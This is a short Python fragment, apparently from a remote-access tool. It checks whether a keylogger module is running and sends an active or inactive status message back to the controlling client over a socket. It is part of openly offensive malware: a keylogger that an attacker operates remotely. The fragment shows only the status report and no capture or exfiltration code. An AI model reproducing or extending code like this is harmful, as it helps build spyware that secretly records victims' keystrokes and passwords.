
status = nt_kl.get_status()
if status:
    resp = '[+] Keylogger is active\n'
else:
    resp = '[+] Keylogger is inactive\n'

send(client_socket,resp)
